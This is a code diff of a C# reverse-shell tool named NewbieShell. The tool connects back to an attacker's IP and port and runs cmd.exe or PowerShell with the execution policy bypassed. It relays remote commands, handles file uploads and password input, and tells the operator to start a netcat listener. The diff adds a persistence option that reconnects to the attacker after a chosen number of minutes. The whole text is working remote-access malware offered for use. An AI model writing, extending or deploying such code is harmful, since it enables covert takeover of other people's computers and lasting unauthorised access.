@@ -19,14 +19,17 @@ namespace NewbieShell
     /// Example: NewbieShell.exe 192.168.0.1 80 cmd.exe
     /// </summary>
 
-    class Program
+    public class Program
     {
         static StreamWriter sw;
         static string ip;
         static string path = @"C:\temp";
+        static bool persistence = false;
+        static int reconnecttimer = 0;
 
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
+
             /// if no args, then question
             if (args.Length > 0)
             {
@@ -57,12 +60,12 @@ namespace NewbieShell
                 }
                 else
                 {
-                    Console.Write("Attacker Port: ");
+                    Console.Write("Attacker port: ");
                     port = Convert.ToInt32(Console.ReadLine());
 
                     if (port != 0)
                     {
-                        Console.Write("Press 0 for 'cmd shell' or 1 for 'powershell' ");
+                        Console.Write("Press 0 for 'cmd.exe' or 1 for 'powershell': ");
                         string shell = Console.ReadLine();
                         string command = string.Empty;
 
@@ -79,7 +82,7 @@ namespace NewbieShell
                             command = "cmd.exe";
                         }
 
-                        Console.WriteLine(string.Format("Start Netcat with this command 'nc -vlnp {0}' on the attacker PC: ", port));
+                        Console.WriteLine(string.Format("Start netcat with this command 'nc -vlnp {0}' on the attacker computer: ", port));
                         Console.Write("Press a button");
                         Console.ReadLine();
 
@@ -121,35 +124,35 @@ namespace NewbieShell
 
                             Console.WriteLine("Connected");
 
-                            Process process = new Process();
-                            process.StartInfo.FileName = command;
+                            Process pc = new Process();
+                            pc.StartInfo.FileName = command;
 
                             // When the command is powershell.exe then write as argument "-ep bypass" to bypass the Powershell
                             // Execution Policy
                             if (command == "powershell.exe")
                             {
-                                process.StartInfo.Arguments = "-ep bypass";
+                                pc.StartInfo.Arguments = "-ep bypass";
                             }
 
-                            process.StartInfo.CreateNoWindow = true;
-                            process.StartInfo.UseShellExecute = false;
-                            process.StartInfo.RedirectStandardOutput = true;
-                            process.StartInfo.RedirectStandardInput = true;
-                            process.StartInfo.RedirectStandardError = true;
-                            process.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-                            process.ErrorDataReceived += new DataReceivedEventHandler(CmdErrorDataHandler);
+                            pc.StartInfo.CreateNoWindow = true;
+                            pc.StartInfo.UseShellExecute = false;
+                            pc.StartInfo.RedirectStandardOutput = true;
+                            pc.StartInfo.RedirectStandardInput = true;
+                            pc.StartInfo.RedirectStandardError = true;
+                            pc.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                            pc.ErrorDataReceived += new DataReceivedEventHandler(CmdErrorDataHandler);
                             try
                             {
-                                process.Start();
-                                process.BeginOutputReadLine();
-                                process.BeginErrorReadLine();
+                                pc.Start();
+                                pc.BeginOutputReadLine();
+                                pc.BeginErrorReadLine();
                                
                             }
                             catch (Exception ex)
                             {
 
                                 Console.WriteLine(ex.Message);
-                                process.WaitForExit();
+                                pc.WaitForExit();
                                 client.Close();
                                 Environment.Exit(0);
                             }
@@ -157,8 +160,8 @@ namespace NewbieShell
                             System.Threading.Thread.Sleep(1000);
 
                             if (!System.IO.Directory.Exists(path))
-                            {                             
-                                process.StandardInput.WriteLine("mkdir C:\\temp");
+                            {
+                                pc.StandardInput.WriteLine("mkdir C:\\temp");
                                 sw.WriteLine("Newbie - Shell create a folder with the name C:\\temp");
                                 sw.Flush();
                             }
@@ -224,7 +227,7 @@ namespace NewbieShell
 
                                         try
                                         {
-                                            process.StandardInput.WriteLine(cmd);
+                                            pc.StandardInput.WriteLine(cmd);
                                             sw.WriteLine(string.Format("OK"));
                                             sw.Flush();
                                         }
@@ -276,7 +279,7 @@ namespace NewbieShell
 
                                         try
                                         {
-                                            process.StandardInput.WriteLine(cmd);
+                                            pc.StandardInput.WriteLine(cmd);
                                             sw.WriteLine(string.Format("{0} - File is uploaded on {1}", filename, websource));
                                             sw.Flush();
                                         }
@@ -336,9 +339,9 @@ namespace NewbieShell
 
                                         try
                                         {
-                                            process.StandardInput.WriteLine(cmd);
+                                            pc.StandardInput.WriteLine(cmd);
                                             System.Threading.Thread.Sleep(1000);
-                                            process.StandardInput.WriteLine(password);
+                                            pc.StandardInput.WriteLine(password);
                                             sw.WriteLine(string.Format("OK"));
                                             sw.Flush();
                                         }
@@ -349,18 +352,56 @@ namespace NewbieShell
                                             Console.WriteLine(ex.Message);
                                         }
                                     }
+                                    // If persistence is true, the system will try to reconnect to the attacker after few minutes.
+                                    else if (sb.ToString().ToUpper() == "#P")
+                                    {
+                                        sb.Remove(0, sb.Length);
+
+                                        sw.Write("Do you want to reconnect in case of a connection failure. Y or N: ");
+                                        sw.Flush();
+                                        string answer = rdr.ReadLine();
+
+                                        if (answer.ToUpper() == "Y")
+                                        {
+                                            persistence = true;
+
+                                            sw.Write("After how many minutes should the connection be established?: ");
+                                            sw.Flush();
+                                            answer = rdr.ReadLine();
+                                            int number = 0;
+
+                                            bool isparsable = Int32.TryParse(answer, out number);
+
+                                            if (number != 0 && isparsable)
+                                            {
+                                                reconnecttimer = number;
+                                            }
+                                            else
+                                            {
+                                                reconnecttimer = 5;
+                                            }
+
+                                            sw.WriteLine("Persistence activated!");
+                                            sw.Flush();
+
+                                        }
+                                        else
+                                        {
+                                            persistence = false;
+                                        }
+
+                                    }
                                     // Standard command
                                     else
                                     {
                                         try
                                         {
-                                            process.StandardInput.WriteLine(sb);
+                                            pc.StandardInput.WriteLine(sb);
                                             sb.Remove(0, sb.Length);
                                         }
                                         catch (Exception ex)
                                         {
                                             Console.WriteLine(ex.Message);
-                                            process.WaitForExit();
                                             client.Close();
                                             Environment.Exit(0);
                                         }
@@ -371,9 +412,17 @@ namespace NewbieShell
                                 catch (Exception ex)
                                 {
                                     Console.WriteLine(ex.Message);
-                                    process.WaitForExit();
-                                    client.Close();
-                                    Environment.Exit(0);
+
+                                    if (persistence)
+                                    {
+                                        Console.WriteLine("Reconnection started in " + reconnecttimer + " minutes");
+                                        ReConnection(ip, port, command, reconnecttimer);
+                                    }
+                                    else
+                                    {
+                                        client.Close();
+                                        Environment.Exit(0);
+                                    }
                                 }
                             }
                         }
@@ -385,7 +434,6 @@ namespace NewbieShell
                 Console.WriteLine(ex.Message);
                 Environment.Exit(0);
             }
-
         }
 
         /// <summary>
@@ -434,6 +482,18 @@ namespace NewbieShell
                     Console.WriteLine(err);
                 }
             }
+        }
+        /// <summary>
+        /// Reconnection after connection break up
+        /// </summary>
+        /// <param name="ip"></param>
+        /// <param name="port"></param>
+        /// <param name="command"></param>
+        /// <param name="timer"></param>
+        private static void ReConnection(string ip, int port, string command, int timer)
+        {
+            System.Threading.Thread.Sleep(timer * 60000);
+            Connection(ip, port, command);
         }
     }
 }
